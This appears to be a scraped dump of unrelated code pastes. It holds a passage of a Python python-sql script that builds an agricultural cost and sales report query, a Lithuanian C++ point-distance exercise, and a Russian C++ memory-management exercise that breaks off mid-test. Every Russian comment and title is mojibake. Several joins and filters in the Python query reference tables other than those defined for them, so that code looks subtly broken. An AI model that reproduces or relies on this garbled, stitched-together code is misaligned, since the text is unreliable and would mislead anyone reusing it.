            & (sale2.company == 1)
            & (Coalesce(sale2.sale_date, from_date) > from_date)
        ),
        group_by=invoice_origin_column
)

unit_load = Table('stock_unit_load')
rline = Table('agro_goods_receipt_line')
receipt = Table('agro_goods_receipt')
entry = Table('agro_goods_entry')
product = Table('product_product')
template = Table('product_template')
company = Table('company_company')
currency = Table('currency_currency')
uom = Table('product_uom')
sale_unit_load = Table('stock_unit_load')
destination_product = Table('product_product')
destination_comb = Table('agro_product_attribute_combination')
sale_line = Table('sale_line')
sale = Table('sale_sale')

windows = {
    'sale_quantity': Sum(
        base_query.destination_quantity,
        window=Window([sale_line.id])),
    'entry_quantity': Sum(
        Case(
            (unit_load.goods_receipt_line != Null,
                Round(Coalesce(base_query.received_quantity,
                        Coalesce(base_query.received_quantity,
                            unit_load.internal_quantity)
                        ).cast('numeric'), DIGITS)
            ), else_=Null), window=Window(
            [rline.entry]))
}

cost_line = Table('agro_goods_entry_cost_line')
cost = Table('agro_goods_entry_cost')
cost_type = Table('agro_goods_entry_cost_type')
cost_entry = Table('agro_goods_entry')
cost_receipt = Table('agro_goods_receipt')
base_cost_query = cost_line.join(cost, condition=(cost.id == cost_line.cost)
        ).join(cost_type, condition=(cost_type.id == cost.type_)
        ).join(cost_entry, condition=(cost_entry.id == cost_line.document_line)
        ).join(cost_receipt, condition=cost_receipt.id == cost_entry.receipt)
cost_query = base_cost_query.select(
    cost_line.document_line.as_('entry'),
    Sum(cost_line.amount).as_('amount'),
    where=(
        (cost_receipt.company == 1)
        & (Coalesce(cost_receipt.effectivate_date, from_date) > from_date)
        & (cost_line.amount != Null)
        & (cost.state == 'confirmed')),
    group_by=cost_line.document_line)

entry_invoice_line = Table('account_invoice_line')
entry_invoice = Table('account_invoice')
ientry = Table('agro_goods_entry')
ireceipt = Table('agro_goods_receipt')
invoice_origin_column = Substring(entry_invoice_line.origin,
    Position(',', entry_invoice_line.origin) + Literal(1))
invoice_entry_base_query = entry_invoice_line.join(entry_invoice, type_='LEFT',
        condition=(invoice.id == invoice_line.invoice)
    ).join(ientry, condition=(
        ientry.id == invoice_origin_column.cast('int'))
    ).join(ireceipt, condition=(ireceipt.id == ientry.receipt))
invoice_entry_query = invoice_entry_base_query.select(
        Cast(invoice_origin_column, 'int').as_('entry'),
        Sum(entry_invoice_line.unit_price * entry_invoice_line.quantity
            ).as_('amount'),
        Min(entry_invoice.invoice_date).as_('invoice_date_min'),
        where=(
            (Coalesce(entry_invoice.state, 'draft') != 'cancelled')
            & (ireceipt.company == 1)
            & (Coalesce(ireceipt.effective_date, from_date) > from_date)
            & entry_invoice_line.origin.like('agro.goods.entry,%')
        ),
        group_by=invoice_origin_column)

prcost = Table('cm_unit_load_cost_alloc')
processing_rcost = prcost.select(
    prcost.end_.as_('unit_load'),
    Sum(prcost.amount).as_('processing_cost_amount'),
    Sum(Case((prcost.type_ == 1, prcost.amount),
        else_=0)).as_('processing_fixed_cost_amount'),
    Sum(Case((prcost.type_ == 2, prcost.amount),
        else_=0)).as_('processing_labor_cost_amount'),
    where=(
        (prcost.company == 1)
        & (Coalesce(prcost.date, from_date) > from_date)),
    group_by=prcost.end_
)

pscost = Table('cm_unit_load_cost_alloc')
processing_scost = pscost.select(
    pscost.end_.as_('unit_load'),
    Sum(pscost.amount).as_('processing_cost_amount'),
    Sum(Case((pscost.type_ == 1, pscost.amount),
        else_=0)).as_('processing_fixed_cost_amount'),
    Sum(Case((pscost.type_ == 2, pscost.amount),
        else_=0)).as_('processing_labor_cost_amount'),
    where=(
        (pscost.company == 1)
        & (Coalesce(pscost.date, from_date) > from_date)),
    group_by=pscost.end_
)

scost = Table('sale_cost')
scost_line = Table('sale_cost_line')
scost_type = Table('sale_cost_type')
scost_sale = Table('sale_sale')
sale_cost_base_query = scost_line.join(scost,
        condition=(scost.id == scost_line.cost)
    ).join(scost_type, condition=(scost_type.id == scost.type_)
    ).join(scost_sale, condition=(scost.document == scost_sale.id))
sale_cost_query = sale_cost_base_query.select(
    scost_line.document_line.as_('sale_line'),
    Sum(scost_line.amount).as_('amount'),
    where=(
        (scost_sale.company == 1)
        & (Coalesce(scost_sale.sale_date, from_date) > from_date)),
    group_by=scost_line.document_line)

sale_account_line = Table('sale_sale_account_line')
asale_line = Table('sale_line')
asale = Table('sale_sale')
sale_account_query = sale_account_line.join(asale_line, condition=(
        sale_account_line.sale_line == asale_line.id)
    ).join(asale, condition=(asale.id == asale_line.sale)
    ).select(
        sale_account_line.sale_line,
        Sum(sale_account_line.quantity).as_('quantity'),
        where=(
            (sale.company == 1)
            & (Coalesce(sale.sale_date, from_date) > from_date)),
        group_by=(sale_account_line.sale_line))


query = base_query.join(unit_load, condition=(
            base_query.received_unit_load == unit_load.id)
        ).join(product, condition=(
            product.id == unit_load.product)
        ).join(template, condition=(
            product.template == template.id)
        ).join(rline, condition=(
            rline.id == unit_load.goods_receipt_line)
        ).join(entry, condition=(
            rline.entry == entry.id)
        ).join(receipt, condition=(receipt.id == rline.receipt)
        ).join(company, condition=(unit_load.company == company.id)
        ).join(currency, condition=(company.currency == currency.id)
        ).join(uom, condition=(uom.id == template.default_uom)
        ).join(sale_unit_load, 'LEFT', condition=(
            sale_unit_load.id == base_query.destination_unit_load)
        ).join(destination_product, 'LEFT', condition=(
            sale_unit_load.product == destination_product.id)
        ).join(destination_comb, 'LEFT', condition=(
            destination_comb.result_product == destination_product.template)
        ).join(sale_line, type_='LEFT', condition=(
            sale_line.id == sale_unit_load.sale_line)
        ).join(sale, type_='LEFT', condition=(sale.id == sale_line.sale)
        ).join(invoice_query, type_='LEFT', condition=(
            invoice_query.sale_line == sale_line.id)
        ).join(cost_query, 'LEFT', condition=(
            cost_query.entry == entry.id)
        ).join(invoice_entry_query, type_='LEFT', condition=(
            invoice_entry_query.entry == entry.id)
        ).join(processing_rcost, 'LEFT', condition=(
            processing_rcost.unit_load == unit_load.id)
        ).join(processing_scost, 'LEFT', condition=(
            (sale_unit_load.id != Null)
            & (processing_scost.unit_load == sale_unit_load.id)
            & (processing_scost.unit_load != unit_load.id))
        ).join(sale_cost_query, 'LEFT', condition=(
            sale_cost_query.sale_line == sale_line.id)
        ).join(sale_account_query, 'LEFT',
            condition=(sale_account_query.sale_line == sale_line.id)
    ).select(
        unit_load.create_date,
        unit_load.write_date,
        unit_load.create_uid,
        unit_load.write_uid,
        unit_load.company,
        Case(
            (unit_load.goods_receipt_line != Null, unit_load.id),
            else_=Literal(Null)).as_('received_unit_load'),
        Case(
            (unit_load.goods_receipt_line != Null, unit_load.product),
            else_=Literal(Null)).as_('received_product'),
        Cast(receipt.effective_date, 'date').as_('receipt_date'),
        rline.receipt,
        rline.entry.as_('goods_entry'),
        entry.producer,
        entry.origin.as_('entry_origin'),
        Case(
            (Coalesce(entry.origin, '').like('agro.farm.batch,%'),
                Cast(Substring(entry.origin,
                    Position(',', entry.origin) + Literal(1)),
                        'int')
            ),
            else_=Literal(Null)
        ).as_('batch'),
        entry.base_product,
        entry.crop,
        sale.id.as_('sale'),
        sale_line.id.as_('sale_line'),
        sale_line.unit_price.as_('sale_unit_price'),
        sale.party.as_('customer'),
        sale.shipment_party,
        template.default_uom.as_('uom'),
        sale_unit_load.id.as_('destination_unit_load'),
        sale_unit_load.product.as_('destination_product'),
        sale_unit_load.attribute_category.as_('destination_category'),
        sale_unit_load.attribute_caliber.as_('destination_caliber'),
        sale_unit_load.attribute_confection.as_('destination_confection'),
        destination_comb.product.as_('destination_base_product'),
        Case(
            (sale_unit_load.goods_receipt_line != Null, 'farm'),
            else_='warehouse').as_('destination_ul_type'),
        sale.sale_date,
        company.currency,
        currency.digits.as_('currency_digits'),
        uom.digits.as_('uom_digits'),
        invoice_query.invoice_date_min,
        Case(
            (unit_load.goods_receipt_line != Null,
                Round(Coalesce(base_query.received_quantity,
                        Coalesce(base_query.received_quantity,
                            unit_load.internal_quantity)
                        ).cast('numeric'), DIGITS)
            ), else_=Null).as_('received_quantity'),
        Round(
            Case((base_query.destination_unit_load != Null,
                Coalesce(base_query.destination_quantity, 0)),
                else_=0).cast('numeric'), DIGITS).as_('destination_quantity'),
        (sale_line.unit_price * Coalesce(
                base_query.destination_quantity, 0)).as_('sale_amount'),
        Case((
                (invoice.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0),
            Round((Coalesce(invoice.amount, 0) * (
                Coalesce(base_query.destination_quantity, 0)
                / windows['sale_quantity'])
            ).cast('decimal'), currency.digits)
            ),
            else_=Null).as_('invoice_amount'),
        Case(((
            (invoice.sale_line != Null)
            & (Coalesce(windows['sale_quantity'], 0) != 0)),
            Round((Coalesce(invoice.quantity, 0)
                * (Coalesce(base_query.destination_quantity, 0)
                    / windows['sale_quantity'])
                ).cast('numeric'), DIGITS)),
            else_=Null).as_('invoice_quantity'),
        Case((
            Coalesce(sale_unit_load.internal_quantity, 0) == 0, 0),
            else_=Round(
                Coalesce(sale_unit_load.cases_quantity, 0).cast('numeric') * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                    / sale_unit_load.internal_quantity.cast('numeric')
                ).cast('numeric'), DIGITS)
        ).as_('destination_cases_quantity'),
        Coalesce(Coalesce(Case((
                (invoice.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0),
                Round((Coalesce(invoice.amount, 0) * (
                    Coalesce(base_query.destination_quantity, 0)
                    / windows['sale_quantity'])
                ).cast('decimal'), currency.digits)
                ),
                else_=Null),
            (sale_line.unit_price * Coalesce(
                base_query.destination_quantity, 0))), 0
        ).as_('income_amount'),
        Case((
            Coalesce(sale_unit_load.internal_quantity, 0) == 0, 0),
            else_=-Round(
                (sale_unit_load.bom_amount * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                    / sale_unit_load.internal_quantity)).cast('decimal'),
                currency.digits)
        ).as_('bom_amount'),
        Case((
            (cost_entry.entry != Null) & (windows['entry_quantity'] != 0),
            -Round((
                Coalesce(cost_entry.amount, 0) * (
                    Coalesce(Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null), 0)
                    / windows['entry_quantity'])).cast('decimal'),
            currency.digits)), else_=Null).as_('entry_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_fixed_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_fixed_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_fixed_cost_amount'),
        Case((
                Coalesce(sale_unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_scost.processing_labor_cost_amount, 0)
                    / sale_unit_load.internal_quantity
                        ) * Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0).cast('numeric'), DIGITS)
                        ).cast('decimal'),
                    currency.digits)),
            else_=0) + Case((
                Coalesce(unit_load.internal_quantity, 0) != 0,
                Round(((Coalesce(-processing_rcost.processing_labor_cost_amount, 0)
                    / unit_load.internal_quantity
                        ) * Case(
                        (unit_load.goods_receipt_line != Null,
                            Round(Coalesce(base_query.received_quantity,
                                    Coalesce(base_query.received_quantity,
                                        unit_load.internal_quantity)
                                    ).cast('numeric'), DIGITS)
                        ), else_=Null)).cast('decimal'),
                    currency.digits)),
                else_=0).as_('processing_labor_cost_amount'),
            Case((
                Coalesce(sale_line.quantity, 0) != 0,
                -Round((Coalesce(
                    sale_cost_query.amount, 0) * (
                    Round(
                        Case((base_query.destination_unit_load != Null,
                            Coalesce(base_query.destination_quantity, 0)),
                            else_=0
                            ).cast('numeric'), DIGITS) / sale_line.quantity)
                                ).cast('decimal'), currency.digits)),
                else_=0).as_('sale_cost_amount'),
            Case(((
                (sale_account_query.sale_line != Null)
                & (Coalesce(windows['sale_quantity'], 0) != 0)),
                Round((Coalesce(sale_account_query.quantity, 0)
                    * (Coalesce(base_query.destination_quantity, 0)
                        / windows['sale_quantity'])
                ).cast('numeric'), DIGITS)),
                else_=Null).as_('sold_account_quantity'),
        where=(
            (receipt.company == 1)
            & (Coalesce(receipt.effective_date, from_date) > from_date))
    )

print(query)
print(query.params)
"
j7pFs4WQ,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 09:17:29 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;

struct Point {

    double x;
    double y;
    string s;

    Point(string s){
        this->s = s;
        x = 0;
        y = 0;
    }

    Point(string s, int x, int y){
        this->s = s;
        this->x = x;
        this->y = y;
    }

    void print(){
        cout << s << "": ("" << x << "","" << y << "")"" << endl;
    }

    void read(){
        cout << s << "" taskas, ivesk dvi koordinates: "";
        cin >> x >> y;
        this->s = s;
    }

    double getDistance(Point q){
        double dx = this->x-q.x;
        double dy = this->y-q.y;
        return sqrt(dx*dx + dy*dy);
    }

};





int main(){

    Point p1(""Pirmas"", 1, 2), p2(""Antras"", 4, 5), p3(""Trecias"");
    p3.read();

    cout << ""Turime tris taskus: "" << endl;
    p1.print();
    p2.print();
    p3.print();

    cout << ""Atstumas tarp p1 ir p2 yra "" << p1.getDistance(p2) << endl;
    cout << ""Atstumas tarp p1 ir p3 yra "" << p1.getDistance(p3) << endl;

    return 0;
}
"
R5bJSVEG,–°–ü–†–ò–ù–¢ ‚Ññ 7 | –ú–æ–¥–µ–ª—å –ø–∞–º—è—Ç–∏ –≤ C++ | –£—Ä–æ–∫ 9: –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–±—ä–µ–∫—Ç–æ–≤. –ß–∞—Å—Ç—å —Ç—Ä–µ—Ç—å—è 2/2,chevengur,C++,Tuesday 23rd of April 2024 09:10:01 AM CDT,"octopus.h

#pragma once

// –¢—É—Ç –º–æ–∂–Ω–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å scopedptr.h –∏ ptrvector.h, 
// –µ—Å–ª–∏ –æ–Ω–∏ –≤–∞–º –ø–æ–Ω–∞–¥–æ–±—è—Ç—Å—è.
#include ""ptrvector.h""
#include ""scopedptr.h""
#include <new> // –î–ª—è –∏—Å–∫–ª—é—á–µ–Ω–∏—è bad_alloc
#include <vector>

// –©—É–ø–∞–ª—å—Ü–µ
class Tentacle {
public:
    explicit Tentacle(int id) noexcept
        : id_(id) {
    }

    int GetId() const noexcept {
        return id_;
    }

    Tentacle* GetLinkedTentacle() const noexcept {
        return linked_tentacle_;
    }
    void LinkTo(Tentacle& tentacle) noexcept {
        linked_tentacle_ = &tentacle;
    }
    void Unlink() noexcept {
        linked_tentacle_ = nullptr;
    }

private:
    int id_ = 0;
    Tentacle* linked_tentacle_ = nullptr;
};

// –û—Å—å–º–∏–Ω–æ–≥
class Octopus {
public:
    Octopus()
        : Octopus(8) {
    }

    explicit Octopus(int num_tentacles) {
        Tentacle* t = nullptr;
        try {
            for (int i = 1; i <= num_tentacles; ++i) {
                t = new Tentacle(i);      // –ú–æ–∂–µ—Ç –≤—ã–±—Ä–æ—Å–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ bad_alloc
                tentacles_.GetItems().push_back(t);  // –ú–æ–∂–µ—Ç –≤—ã–±—Ä–æ—Å–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ bad_alloc
                
                // –û–±–Ω—É–ª—è–µ–º —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —â—É–ø–∞–ª—å—Ü–µ, –∫–æ—Ç–æ—Ä–æ–µ —É–∂–µ –¥–æ–±–∞–≤–∏–ª–∏ –≤ tentacles_,
                // —á—Ç–æ–±—ã –Ω–µ —É–¥–∞–ª–∏—Ç—å –µ–≥–æ –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ catch –ø–æ–≤—Ç–æ—Ä–Ω–æ
                t = nullptr;
            }
        }
        catch (const std::bad_alloc&) {
            // –£–¥–∞–ª—è–µ–º —â—É–ø–∞–ª—å—Ü–∞, –∫–æ—Ç–æ—Ä—ã–µ —É—Å–ø–µ–ª–∏ –ø–æ–ø–∞—Å—Ç—å –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä tentacles_
            Cleanup();
            // –£–¥–∞–ª—è–µ–º —â—É–ø–∞–ª—å—Ü–µ, –∫–æ—Ç–æ—Ä–æ–µ —Å–æ–∑–¥–∞–ª–∏, –Ω–æ –Ω–µ –¥–æ–±–∞–≤–∏–ª–∏ –≤ tentacles_
            delete t;
            // –ö–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä –Ω–µ —Å–º–æ–≥ —Å–æ–∑–¥–∞—Ç—å –æ—Å—å–º–∏–Ω–æ–≥–∞ —Å –≤–æ—Å–µ–º—å—é —â—É–ø–∞–ª—å—Ü–∞–º–∏,
            // –ø–æ—ç—Ç–æ–º—É –≤—ã–±—Ä–∞—Å—ã–≤–∞–µ–º –∏—Å–∫–ª—é—á–µ–Ω–∏–µ, —á—Ç–æ–±—ã —Å–æ–æ–±—â–∏—Ç—å –≤—ã–∑—ã–≤–∞—é—â–µ–º—É –∫–æ–¥—É –æ–± –æ—à–∏–±–∫–µ
            // throw –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –≤–Ω—É—Ç—Ä–∏ catch –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ü–ï–†–ï–í–´–ë–†–û–° –ø–æ–π–º–∞–Ω–Ω–æ–≥–æ –∏—Å–∫–ª—é—á–µ–Ω–∏—è
            throw;
        }
    }

    ~Octopus() {
        // –û—Å—å–º–∏–Ω–æ–≥ –≤–ª–∞–¥–µ–µ—Ç –æ–±—ä–µ–∫—Ç–∞–º–∏ –≤ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–π –ø–∞–º—è—Ç–∏ (—â—É–ø–∞–ª—å—Ü–∞),
        // –∫–æ—Ç–æ—Ä—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —É–¥–∞–ª–µ–Ω—ã –ø—Ä–∏ –µ–≥–æ —Ä–∞–∑—Ä—É—à–µ–Ω–∏–∏.
        // –î–µ—Å—Ç—Ä—É–∫—Ç–æ—Ä - –ª—É—á—à–µ–µ –º–µ—Å—Ç–æ, —á—Ç–æ–±—ã –ø—Ä–∏–±—Ä–∞—Ç—å—Å—è –∑–∞ —Å–æ–±–æ–π.
        Cleanup();
    }

    // –î–æ–±–∞–≤–ª—è–µ—Ç –Ω–æ–≤–æ–µ —â—É–ø–∞–ª—å—Ü–µ —Å –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º,
    // —Ä–∞–≤–Ω—ã–º (–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ_—â—É–ø–∞–ª–µ—Ü + 1):
    // 1, 2, 3, ...
    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ –¥–æ–±–∞–≤–ª–µ–Ω–Ω–æ–µ —â—É–ø–∞–ª—å—Ü–µ
    Tentacle& AddTentacle() {
        ScopedPtr<Tentacle>tentacle(new Tentacle(GetTentacleCount() + 1));
        tentacles_.GetItems().push_back(tentacle.GetRawPtr());
        tentacle.Release();
        return *tentacles_.GetItems().back();
    }

    int GetTentacleCount() const noexcept {
        return static_cast<int>(tentacles_.GetItems().size());
    }

    const Tentacle& GetTentacle(size_t index) const {
        return *tentacles_.GetItems().at(index);
    }
    Tentacle& GetTentacle(size_t index) {
        return *tentacles_.GetItems().at(index);
    }

private:
    void Cleanup() {
        // –£–¥–∞–ª—è–µ–º —â—É–ø–∞–ª—å—Ü–∞ –æ—Å—å–º–∏–Ω–æ–≥–∞ –∏–∑ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–π –ø–∞–º—è—Ç–∏
        for (Tentacle* t : tentacles_.GetItems()) {
            delete t;
        }
        // –û—á–∏—â–∞–µ–º –º–∞—Å—Å–∏–≤ —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ —â—É–ø–∞–ª—å—Ü–∞
        tentacles_.GetItems().clear();
    }
    
    // –í–µ–∫—Ç–æ—Ä —Ö—Ä–∞–Ω–∏—Ç —É–∫–∞–∑–∞—Ç–µ–ª–∏ –Ω–∞ —â—É–ø–∞–ª—å—Ü–∞. –°–∞–º–∏ –æ–±—ä–µ–∫—Ç—ã —â—É–ø–∞–ª–µ—Ü –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –∫—É—á–µ
    
    PtrVector<Tentacle> tentacles_;
};

=======================================================================================================================================

ptrvector.h

#pragma once

#include <vector>

template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // –°–æ–∑–¥–∞—ë—Ç –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ –∫–æ–ø–∏–∏ –æ–±—ä–µ–∫—Ç–æ–≤ –∏–∑ other
    PtrVector(const PtrVector& other) {
        // –†–µ–∑–µ—Ä–≤–∏—Ä—É–µ–º –º–µ—Å—Ç–æ –≤ vector-–µ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω—É–∂–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —ç–ª–µ–º–µ–Ω—Ç–æ–≤
        // –ë–ª–∞–≥–æ–¥–∞—Ä—è —ç—Ç–æ–º—É –ø—Ä–∏ push_back –Ω–µ –±—É–¥–µ—Ç –≤—ã–±—Ä–∞—Å—ã–≤–∞—Ç—å—Å—è –∏—Å–∫–ª—é—á–µ–Ω–∏–µ
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // –ö–æ–ø–∏—Ä—É–µ–º –æ–±—ä–µ–∫—Ç, –µ—Å–ª–∏ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –Ω–µ–≥–æ –Ω–µ–Ω—É–ª–µ–≤–æ–π
                auto p_copy = p ? new T(*p) : nullptr;  // new –º–æ–∂–µ—Ç –≤—ã–±—Ä–æ—Å–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ

                // –ù–µ –≤—ã–±—Ä–æ—Å–∏—Ç –∏—Å–∫–ª—é—á–µ–Ω–∏–µ, —Ç. –∫. –≤ vector –ø–∞–º—è—Ç—å —É–∂–µ –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–∞
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // —É–¥–∞–ª—è–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã –≤ –≤–µ–∫—Ç–æ—Ä–µ –∏ –ø–µ—Ä–µ–≤—ã–±—Ä–∞—Å—ã–≤–∞–µ–º –ø–æ–π–º–∞–Ω–Ω–æ–µ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ
            DeleteItems();
            throw;
        }
    }

    // –î–µ—Å—Ç—Ä—É–∫—Ç–æ—Ä —É–¥–∞–ª—è–µ—Ç –æ–±—ä–µ–∫—Ç—ã –≤ –∫—É—á–µ, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–µ —Å—Å—ã–ª–∞—é—Ç—Å—è —É–∫–∞–∑–∞—Ç–µ–ª–∏,
    // –≤ –≤–µ–∫—Ç–æ—Ä–µ items_
    ~PtrVector() {
        DeleteItems();
    }

    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π
    std::vector<T*>& GetItems() noexcept {
        return items_;
    }

    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∫–æ–Ω—Å—Ç–∞–Ω—Ç–Ω—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –≤–µ–∫—Ç–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π
    std::vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    std::vector<T*> items_;
};

=======================================================================================================================================

scopedptr.h

#pragma once

#include <stdexcept> // —Å–æ–¥–µ—Ä–∂–∏—Ç std::logic_error

template <typename T>
class ScopedPtr {
public:
    ScopedPtr() = default;

    explicit ScopedPtr(T* raw_ptr) noexcept
        : ptr_(raw_ptr) {
    }

    // –ó–∞–ø—Ä–µ—â–∞–µ–º –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è
    ScopedPtr(const ScopedPtr&) = delete;

    ~ScopedPtr() {
        delete ptr_;
    }

    T* GetRawPtr() const noexcept {
        return ptr_;
    }

    T* Release() noexcept {
        T* p = ptr_;
        ptr_ = nullptr;
        return p;
    }

    explicit operator bool() const {
        return ptr_ != nullptr;
    }

    T* operator->() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return ptr_;
    }

    T& operator*() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return *ptr_;
    }

private:
    T* ptr_ = nullptr;
};

=======================================================================================================================================

main.cpp

#include ""octopus.h""

#include <cassert>
#include <iostream>

using namespace std;

int main() {
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–Ω—Å—Ç—Ä—É–∏—Ä–æ–≤–∞–Ω–∏—è –æ—Å—å–º–∏–Ω–æ–≥–æ–≤
    {
        // –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é –æ—Å—å–º–∏–Ω–æ–≥ –∏–º–µ–µ—Ç 8 —â—É–ø–∞–ª–µ—Ü
        Octopus default_octopus;
        assert(default_octopus.GetTentacleCount() == 8);

        // –û—Å—å–º–∏–Ω–æ–≥ –º–æ–∂–µ—Ç –∏–º–µ—Ç—å –æ—Ç–ª–∏—á–Ω–æ–µ –æ—Ç 8 –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —â—É–ø–∞–ª–µ—Ü
        Octopus quadropus(4);
        assert(quadropus.GetTentacleCount() == 4);

        // –ò –¥–∞–∂–µ –≤–æ–æ–±—â–µ –Ω–µ –∏–º–µ—Ç—å —â—É–ø–∞–ª–µ—Ü
        Octopus coloboque(0);
        assert(coloboque.GetTentacleCount() == 0);
    }

    // –û—Å—å–º–∏–Ω–æ–≥—É –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–ª—è—Ç—å —â—É–ø–∞–ª—å—Ü–∞
    {
        Octopus octopus(1);
        Tentacle* t0 = &octopus.GetTentacle(0);
        Tentacle* t1 = &octopus.AddTentacle();
        assert(octopus.GetTentacleCount() == 2);
        Tentacle* t2 = &octopus.AddTentacle();
        assert(octopus.GetTentacleCount() == 3);

        // –ü–æ—Å–ª–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —â—É–ø–∞–ª–µ—Ü —Ä–∞–Ω–µ–µ —Å–æ–∑–¥–∞–Ω–Ω—ã–µ —â—É–ø–∞–ª—å—Ü–∞ –Ω–µ –º–µ–Ω—è—é—Ç —Å–≤–æ–∏—Ö –∞–¥—Ä–µ—Å–æ–≤
        assert(&octopus.GetTentacle(0) == t0);
        assert(&octopus.GetTentacle(1) == t1);
        assert(&octopus.GetTentacle(2) == t2);

        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            assert(octopus.GetTentacle(i).GetId() == i + 1);
        }
    }

    // –û—Å—å–º–∏–Ω–æ–≥–∏ –º–æ–≥—É—Ç –ø—Ä–∏—Ü–µ–ø–ª—è—Ç—å—Å—è –∫ —â—É–ø–∞–ª—å—Ü–∞–º –¥—Ä—É–≥ –¥—Ä—É–≥–∞
    {
        Octopus male(2);
        Octopus female(2);

        assert(male.GetTentacle(0).GetLinkedTentacle() == nullptr);

        male.GetTentacle(0).LinkTo(female.GetTentacle(1));
        assert(male.GetTentacle(0).GetLinkedTentacle() == &female.GetTentacle(1));

        male.GetTentacle(0).Unlink();
        assert(male.GetTentacle(0).GetLinkedTentacle() == nullptr);
    }

